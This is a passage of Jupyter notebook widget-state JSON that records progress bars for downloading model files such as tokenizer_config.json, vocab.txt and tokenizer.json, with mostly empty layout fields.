            "layout": "IPY_MODEL_ff58a340c68c402b97911ae55cd2721b",
            "max": 437955512,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_4355535fd0af4cffb11e843e342bff41",
            "value": 437955512
          }
        },
        "58eeaed329324a77b38425d51a2174de": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_a892d241754d42fb81ff8aa9e32d2f44",
            "placeholder": "​",
            "style": "IPY_MODEL_1cdf77ca653347a1a842345689f6f09b",
            "value": " 438M/438M [00:01&lt;00:00, 270MB/s]"
          }
        },
        "5e97111dee904076a424c8d0580dcca6": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "3866a036e89843659ee745dfa9d806bb": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "2df8c0f20c1248d48b1a4379a14b8f26": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "ff58a340c68c402b97911ae55cd2721b": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "4355535fd0af4cffb11e843e342bff41": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "a892d241754d42fb81ff8aa9e32d2f44": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "1cdf77ca653347a1a842345689f6f09b": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "0f7b499ababc42f2b90edb031e4c74d8": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_1d329dab06cb4b7dae285d4892cb7496",
              "IPY_MODEL_59772ad81c364113a55e567b12c8a50a",
              "IPY_MODEL_b6f12f419d7643fdb2f09f7bae287cf0"
            ],
            "layout": "IPY_MODEL_ef95531bdf1d4e26b579dd1b58adfca0"
          }
        },
        "1d329dab06cb4b7dae285d4892cb7496": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_a8e4a9e81fe145ca9874c816f5d31abf",
            "placeholder": "​",
            "style": "IPY_MODEL_24c4f608923c475bb517605342faac93",
            "value": "tokenizer_config.json: 100%"
          }
        },
        "59772ad81c364113a55e567b12c8a50a": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_f720f4b4a39b412c9e7823dd5bc9a969",
            "max": 366,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_851be56085f846bfa65287014ec84b0d",
            "value": 366
          }
        },
        "b6f12f419d7643fdb2f09f7bae287cf0": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_cb205ba96dcd4d9cb2f9299516f6dd99",
            "placeholder": "​",
            "style": "IPY_MODEL_0eb0b50eee7e4252ad211471e2c329f9",
            "value": " 366/366 [00:00&lt;00:00, 17.2kB/s]"
          }
        },
        "ef95531bdf1d4e26b579dd1b58adfca0": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "a8e4a9e81fe145ca9874c816f5d31abf": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "24c4f608923c475bb517605342faac93": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "f720f4b4a39b412c9e7823dd5bc9a969": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "851be56085f846bfa65287014ec84b0d": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "cb205ba96dcd4d9cb2f9299516f6dd99": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "0eb0b50eee7e4252ad211471e2c329f9": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "f2db535c0f0e42cb88a604a993a8b566": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_5e14fb8d297c43b895530b94bc2ce89a",
              "IPY_MODEL_05873afaa61448e9a1141a04816c33c7",
              "IPY_MODEL_15ac652373134ae086600401618eb25d"
            ],
            "layout": "IPY_MODEL_155d7eb453384fee98bb6b54db1d3ba7"
          }
        },
        "5e14fb8d297c43b895530b94bc2ce89a": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_76d8ef6d9f18423783cc164dfc0f9387",
            "placeholder": "​",
            "style": "IPY_MODEL_fe4425e812a649c3b3b9ffc9397c8a31",
            "value": "vocab.txt: 100%"
          }
        },
        "05873afaa61448e9a1141a04816c33c7": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_c7a73c28a3294588843bee452b773030",
            "max": 231508,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_74da5a2accba4e16b432e20bc10c666f",
            "value": 231508
          }
        },
        "15ac652373134ae086600401618eb25d": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_eb011227e2a54edaad33a119c9890c80",
            "placeholder": "​",
            "style": "IPY_MODEL_e11b7f35cba145c3b900729227f96eeb",
            "value": " 232k/232k [00:00&lt;00:00, 11.1MB/s]"
          }
        },
        "155d7eb453384fee98bb6b54db1d3ba7": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "76d8ef6d9f18423783cc164dfc0f9387": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "fe4425e812a649c3b3b9ffc9397c8a31": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "c7a73c28a3294588843bee452b773030": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "74da5a2accba4e16b432e20bc10c666f": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "eb011227e2a54edaad33a119c9890c80": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "e11b7f35cba145c3b900729227f96eeb": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "bfea642b4adf4027bb05d0e96587183f": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_2cdcd7d718874e7db997e1fa9176aa2f",
              "IPY_MODEL_bcf689843c0e4306bcba53102ccb5e97",
              "IPY_MODEL_1e61da75e5424fd8a04b40431214c693"
            ],
            "layout": "IPY_MODEL_87f16f39d3fb4a30805d2e6e72962723"
          }
        },
        "2cdcd7d718874e7db997e1fa9176aa2f": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_972a7f52edc44f1d819e4e1666ea90c5",
            "placeholder": "​",
            "style": "IPY_MODEL_b37f4742010f433b9ae6252c92fd0e29",
            "value": "tokenizer.json: 100%"
          }
        },
        "bcf689843c0e4306bcba53102ccb5e97": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_1a430ea553524d17839d43443da1af15",
            "max": 711396,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_aa3927bda22f4234a172b593f9de44b7",
            "value": 711396
          }
        },
        "1e61da75e5424fd8a04b40431214c693": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_6aca4bd07f1e4c4ab60b242906a6e1ea",
            "placeholder": "​",
            "style": "IPY_MODEL_19a2d56e9c684917bea1815f71fb5155",
            "value": " 711k/711k [00:00&lt;00:00, 2.46MB/s]"
          }
        },
        "87f16f39d3fb4a30805d2e6e72962723": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "972a7f52edc44f1d819e4e1666ea90c5": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "b37f4742010f433b9ae6252c92fd0e29": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
